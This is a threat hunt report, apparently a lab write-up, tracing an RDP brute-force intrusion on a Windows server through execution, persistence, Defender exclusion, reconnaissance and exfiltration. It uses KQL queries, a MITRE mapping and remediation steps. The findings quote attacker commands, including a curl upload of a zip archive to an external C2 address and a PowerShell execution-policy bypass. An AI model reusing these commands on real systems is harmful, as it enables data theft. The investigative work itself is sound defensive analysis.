
# 🧩 Threat Hunt Report — Compromise of `slflarewinsysmo`

## 📘 Scenario Summary

Suspicious RDP login activity was detected on a **cloud-hosted Windows Server**.  
Multiple failed logins were followed by a successful one, indicating a likely **brute-force attack**.  
Subsequent telemetry revealed **malicious binary execution**, **scheduled task persistence**, **Defender exclusions**, **system reconnaissance**, and **data exfiltration** to an external **C2 endpoint**.


| Key Indicator | Value |
|---------------|--------|
| **Compromised Account** | `slflare` |
| **Source IP (Initial Access)** | `159.26.106.84` |
| **Host** | `slflarewinsysmo` |
| **C2 / Exfil Destination** | `185.92.220.87:8081` |

---

## 🪜 Investigation Steps

---

### **1️⃣ Initial Access — RDP Brute Force Success**

**Objective:** Identify the external IP that successfully authenticated after multiple failed attempts.

**Broad KQL Query**

```kql
DeviceLogonEvents
| where DeviceName contains "flare"
| order by Timestamp desc
| project Timestamp, RemoteIP, DeviceName, ActionType
````
**Narrow KQL Query**
```kql
DeviceLogonEvents
| where AccountName == "slflare" and RemoteIP == "159.26.106.84"
| where DeviceName == "slflarewinsysmo"
| order by Timestamp asc
````

**Findings**

* **Timestamp:** `2025-09-16 14:43:46`
* **User:** `slflare`
* **Remote IP:** `159.26.106.84`
* **LogonType:** `RemoteInteractive`

**Commentary:**
The user `slflare` successfully logged in via RDP from an external IP following a pattern of failed attempts — confirming brute-force behavior.

<img width="1825" height="656" alt="image" src="https://github.com/user-attachments/assets/11e112e3-048f-4c69-b236-175156aef545" />


---

### **2️⃣ Execution — Malicious Binary `msupdate.exe`**

**Objective:** Identify the first malicious process executed after compromise.

**KQL Query**

```kql
let ip = "159.26.106.84";
let device = "slflarewinsysmo";
let start = datetime(2025-09-16 14:43:46);
DeviceProcessEvents
| where DeviceName == device
| where Timestamp between (start .. start + 30m)
| where InitiatingProcessAccountName == "slflare" or AccountName == "slflare"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp asc

```

**Findings**

```
"msupdate.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1
Timestamp: 2025-09-16T19:38:40.091015Z
```

**Commentary:**
The attacker executed `msupdate.exe` with PowerShell bypass flags, a common method to evade script-blocking controls.



<img width="1741" height="856" alt="image" src="https://github.com/user-attachments/assets/a965bc79-b607-43d0-acab-89ed52b63be4" />


---

### **3️⃣ Persistence — Scheduled Task `MicrosoftUpdateSync`**

**Objective:** Detect persistence mechanisms such as scheduled tasks.

**KQL Query**

```kql
let startTime = datetime(2025-09-16 19:30:00Z);
let endTime   = datetime(2025-09-16 20:30:00Z);
let device    = "slflarewinsysmo";
DeviceEvents
| where Timestamp between (startTime .. endTime)
| where DeviceName == device
| where ActionType in ("ScheduledTaskCreated","ScheduledTaskModified")
| extend AF = parse_json(AdditionalFields)
| extend TaskName = tostring(AF.TaskName)
| where isnotempty(TaskName)
| project Timestamp, DeviceName, AccountName, ActionType, TaskName, AdditionalFields
| order by Timestamp asc
```

**Findings**

* **Task Name:** `MicrosoftUpdateSync`
* **Type:** Scheduled Task Created
* **Purpose:** Relaunch `msupdate.exe` periodically.

**Commentary:**
Attacker created a new scheduled task for persistence post-compromise.

<img width="2692" height="398" alt="image" src="https://github.com/user-attachments/assets/9ccec94b-2a8e-41e4-b4d1-b8f2f0990041" />


---

### **4️⃣ Defense Evasion — Defender Exclusion Added**

**Objective:** Identify attempts to disable or evade Microsoft Defender.

**KQL Query**

```kql
let startTime = datetime(2025-09-16 19:30:00Z);
let endTime   = datetime(2025-09-16 21:00:00Z);
let device    = "slflarewinsysmo";

DeviceRegistryEvents
| where Timestamp between (startTime .. endTime)
| where DeviceName == device
| where tolower(RegistryKey) has @"\microsoft\windows defender\exclusions\paths"
   or tolower(RegistryKey) has @"\policies\microsoft\windows defender\exclusions\paths"
   or tolower(RegistryKey) has @"\microsoft\windows defender\exclusions\processes"
| extend ExcludedPath = coalesce(RegistryValueName, RegistryValueData)
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, ExcludedPath
| order by Timestamp asc

```

**Findings**

```
RegistryValueName: C:\Windows\Temp
```

**Commentary:**
The attacker excluded `C:\Windows\Temp` from Defender scanning to conceal malicious payloads.

<img width="1957" height="327" alt="image" src="https://github.com/user-attachments/assets/f4992ed2-6226-4b49-acb9-abcf52c96477" />


---

### **5️⃣ Discovery — Host & User Enumeration**

**Objective:** Identify reconnaissance commands executed by the attacker.

**Findings**

```
"cmd.exe" /c systeminfo
whoami.exe
"cmd.exe" /c "wmic computersystem get domain"
quser.exe
```

**Commentary:**
Analysed and processed former logs to identify the attacker gathered system and user information to understand the environment and privileges.

---

### **6️⃣ Collection — Archive Created**

**Objective:** Detect data collection or staging before exfiltration.

**KQL Query**

```kql
DeviceFileEvents
| where FileName endswith ".zip"
| where FolderPath has_any ("\\Temp\\","\\AppData\\")
| project Timestamp, FolderPath, FileName, InitiatingProcessFileName
```

**Findings**

```
C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip
```

**Commentary:**
Look for file creation or process activity involving archiving tools. Focus on .zip, .rar, or .7z files created in non-standard directories such as Temp, AppData, or ProgramData. The attacker compressed sensitive data into a ZIP archive stored in a temporary directory.


---

### **7️⃣ Exfiltration — Outbound POST to C2**

**Objective:** Identify exfiltration of data to an external IP or domain.

**KQL Query**

```kql
DeviceNetworkEvents
| where DeviceName == "slflarewinsysmo"
| where RemoteIP == "185.92.220.87"
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessCommandLine
```

**Findings**

```
curl -X POST -F "file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip" http://185.92.220.87:8081/upload
Destination: 185.92.220.87:8081
```

**Commentary:**
logs show an outbound POST to that host immediately after the archive was created — the attacker used curl to upload C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip to http://185.92.220.87:8081/upload.

*<img width="2467" height="148" alt="image" src="https://github.com/user-attachments/assets/d314414f-fd6f-466c-b4b9-ac7588d19f51" />
**

---

## 🧾 Summary Table

| Stage               | Indicator / Evidence                 | Tactic (MITRE)                        |
| ------------------- | ------------------------------------ | ------------------------------------- |
| **Initial Access**  | RDP success from `159.26.106.84`     | T1110 – Brute Force                   |
| **Execution**       | `msupdate.exe` PowerShell script     | T1059 – Command Interpreter           |
| **Persistence**     | Scheduled Task `MicrosoftUpdateSync` | T1053 – Scheduled Task                |
| **Defense Evasion** | Defender exclusion `C:\Windows\Temp` | T1562.001 – Disable Security Tools    |
| **Discovery**       | `systeminfo`, `whoami`, `wmic`       | T1082, T1016                          |
| **Collection**      | Archive `backup_sync.zip`            | T1074 – Data Staging                  |
| **Exfiltration**    | `curl` → `185.92.220.87:8081`        | T1041 – Exfiltration Over Web Service |

## 🕒 Attack Timeline — `slflarewinsysmo`

| **Timestamp (UTC)** | **Phase** | **Activity** | **Details / Indicators** |
|----------------------|------------|---------------|---------------------------|
| **2025-09-16 14:43:46** | Initial Access | ✅ Successful RDP login after multiple failures | User **`slflare`** authenticated from external IP **`159.26.106.84`** |
| **2025-09-16 19:38:40** | Execution | ⚙️ Malicious binary launched | Executed `"msupdate.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1"` |
| **~19:45 UTC** | Persistence | 🗓 Scheduled task created | Task **`MicrosoftUpdateSync`** registered to relaunch `msupdate.exe` |
| **~19:50 UTC** | Defense Evasion | 🧱 Defender exclusion added | Excluded folder **`C:\Windows\Temp`** from antivirus scanning |
| **~19:55–20:00 UTC** | Discovery | 🔍 System reconnaissance | Commands executed: `systeminfo`, `whoami`, `wmic computersystem get domain`, `quser` |
| **~20:05 UTC** | Collection | 📦 Archive created | File **`C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip`** generated for data staging |
| **~20:13 UTC** | Exfiltration | 🌐 Outbound data upload | `curl -X POST -F "file=@...backup_sync.zip" http://185.92.220.87:8081/upload` |
| **Post-Exfil** | C2 / Command & Control | 🔗 External communication | Persistent outbound traffic to **`185.92.220.87:8081`** (attacker C2) |

---

🧠 **Summary:**  
The attacker gained RDP access, executed a PowerShell payload (`msupdate.exe`), established persistence, evaded AV scanning, performed host enumeration, archived local data, and exfiltrated it via HTTP POST to their external C2.

---



---

## 🧩 Final Observations

The attacker followed a clear kill-chain progression:

1. **RDP Brute Force → Credential Compromise**
2. **PowerShell Payload Execution (`msupdate.exe`)**
3. **Persistence via Scheduled Task**
4. **Defender Exclusion for Evasion**
5. **Reconnaissance & Enumeration**
6. **Archive Creation**
7. **Data Exfiltration to C2 (`185.92.220.87:8081`)**

---

## 🔧 Remediation & Recovery Plan

**Immediate Steps**

```powershell
# 1. Isolate host
Stop-Computer -ComputerName "slflarewinsysmo" -Force

# 2. Remove persistence
schtasks /delete /tn "MicrosoftUpdateSync" /f

# 3. Delete malicious files
del "C:\Users\Public\msupdate.exe"
del "C:\Users\Public\update_check.ps1"
del "C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"

# 4. Restore Defender protection
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp"

# 5. Block malicious IPs
netsh advfirewall firewall add rule name="BlockC2" dir=out remoteip=185.92.220.87 action=block
```

**Preventive Measures**

* Enforce MFA for all RDP access.
* Restrict RDP to VPN or bastion host.
* Implement egress filtering for ports 8080–8081.
* Monitor PowerShell and scheduled task creation events.
* Regularly audit Defender exclusions.

---

## 🏁 Conclusion

This investigation confirmed a **successful RDP brute-force intrusion** leading to **execution of a PowerShell-based payload**, **scheduled task persistence**, and **data exfiltration** via HTTP POST to `185.92.220.87:8081`.

All persistence mechanisms, malware, and network indicators should be **eradicated**, followed by an enterprise-wide **credential reset** and **log review**.

> 🧠 *Report authored collaboratively during threat hunt on 2025-09-16.*
>
> 📂 *Source logs: `New query (8).csv`, `New query (9).csv`, `New query (11).csv`*

---
